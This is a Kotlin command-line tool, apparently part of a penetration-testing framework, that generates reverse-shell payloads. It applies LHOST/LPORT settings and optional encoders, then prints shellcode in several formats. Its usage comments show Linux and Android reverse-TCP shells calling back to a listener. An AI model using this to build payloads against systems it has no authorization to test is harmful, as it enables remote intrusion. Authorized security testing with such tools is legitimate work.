package ancvenom

import anc.core.Framework
import anc.modules.ModuleRegistry
import com.github.ajalt.clikt.core.CliktCommand
import com.github.ajalt.clikt.core.main
import com.github.ajalt.clikt.parameters.arguments.argument
import com.github.ajalt.clikt.parameters.arguments.multiple
import com.github.ajalt.clikt.parameters.options.default
import com.github.ajalt.clikt.parameters.options.flag
import com.github.ajalt.clikt.parameters.options.option
import com.github.ajalt.clikt.parameters.types.choice
import kotlinx.coroutines.runBlocking
import java.io.File
import java.util.Base64

/**
 * ancvenom — AncKit payload generator CLI
 *
 * Usage examples:
 *   ancvenom -p linux/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f hex
 *   ancvenom -p android/shell_reverse_tcp LHOST=10.0.0.5 LPORT=9001 -f raw -o payload.bin
 *   ancvenom --list
 */
class AncVenom : CliktCommand(name = "ancvenom") {
    private val payloadPath by option("-p", "--payload",  help = "Payload path (e.g. linux/shell_reverse_tcp)").default("")
    private val format      by option("-f", "--format",   help = "Output format").choice("raw", "hex", "c", "python", "base64", "kotlin").default("hex")
    private val outFile     by option("-o", "--output",   help = "Write output to file instead of stdout")
    private val encoderPath by option("-e", "--encoder",  help = "Encoder path (e.g. x86/xor_additive)")
    private val listFlag    by option("-l", "--list",     help = "List all available payloads").flag()
    private val varsArgs    by argument("VARS", help = "KEY=VALUE options (e.g. LHOST=127.0.0.1 LPORT=4444)").multiple()

    override fun run() {
        val fw = Framework.initialize(ModuleRegistry.all)

        if (listFlag) {
            listPayloads(fw)
            return
        }

        if (payloadPath.isBlank()) {
            echo("Error: -p/--payload is required (or use --list to see available payloads)", err = true)
            return
        }

        val payload = fw.payloadManager.create(payloadPath)
            ?: fw.payloadManager.create("singles/$payloadPath")
        if (payload == null) {
            echo("Error: payload not found: $payloadPath", err = true)
            echo("Use --list to see available payloads", err = true)
            return
        }

        // Apply KEY=VALUE options from command line
        for (kv in varsArgs) {
            val eq = kv.indexOf('=')
            if (eq < 1) { echo("Warning: skipping malformed option '$kv'", err = true); continue }
            payload.datastore[kv.substring(0, eq)] = kv.substring(eq + 1)
        }

        // Validate required options
        val errors = payload.options.validate(payload.datastore)
        if (errors.isNotEmpty()) {
            errors.forEach { echo("Error: $it", err = true) }
            return
        }

        // Generate
        val raw: ByteArray = runBlocking { payload.generate() }

        // Optionally encode
        val bytes: ByteArray = if (encoderPath != null) {
            runBlocking { fw.encoderManager.encode(raw, encoderPath!!) }
        } else {
            raw
        }

        echo("[*] Payload   : ${payload.fullName}", err = true)
        echo("[*] Size      : ${bytes.size} bytes", err = true)
        echo("[*] Format    : $format", err = true)
        if (encoderPath != null) echo("[*] Encoder   : $encoderPath", err = true)

        val output = formatBytes(bytes, format)

        if (outFile != null) {
            if (format == "raw") {
                File(outFile!!).writeBytes(bytes)
            } else {
                File(outFile!!).writeText(output)
            }
            echo("[+] Saved to  : $outFile", err = true)
        } else {
            if (format == "raw") {
                System.out.write(bytes)
                System.out.flush()
            } else {
                echo(output)
            }
        }
    }

    private fun listPayloads(fw: Framework) {
        val payloads  = fw.payloadManager.all()
        val encoders  = fw.encoderManager.all()
        val nops      = fw.moduleManager.byType(anc.core.ModuleType.NOP)

        echo("\nPayloads (${payloads.size}):")
        payloads.forEach { echo("  ${it.fullName.padEnd(55)} ${it.description}") }

        echo("\nEncoders (${encoders.size}):")
        encoders.forEach { echo("  ${it.fullName.padEnd(55)} ${it.description}") }

        echo("\nNOP generators (${nops.size}):")
        nops.forEach { echo("  ${it.fullName.padEnd(55)} ${it.description}") }
    }

    private fun formatBytes(bytes: ByteArray, fmt: String): String {
        val list = bytes.toList()
        return when (fmt) {
            "hex"    -> bytes.joinToString("") { "%02x".format(it) }
            "c"      -> list.chunked(16).joinToString("\n") { line ->
                            line.joinToString(", ", "\"", "\"") { "\\x%02x".format(it.toInt() and 0xff) }
                        }
            "python" -> "shellcode = (\n" +
                        list.chunked(16).joinToString("\n") { line ->
                            "    b\"" + line.joinToString("") { "\\x%02x".format(it.toInt() and 0xff) } + "\""
                        } + "\n)"
            "base64" -> Base64.getEncoder().encodeToString(bytes)
            "kotlin" -> "val shellcode = byteArrayOf(\n" +
                        list.chunked(12).joinToString(",\n") { line ->
                            "    " + line.joinToString(", ") { "0x%02x".format(it.toInt() and 0xff) }
                        } + "\n)"
            else     -> bytes.joinToString("") { "%02x".format(it) }
        }
    }
}

fun main(args: Array<String>) = AncVenom().main(args)
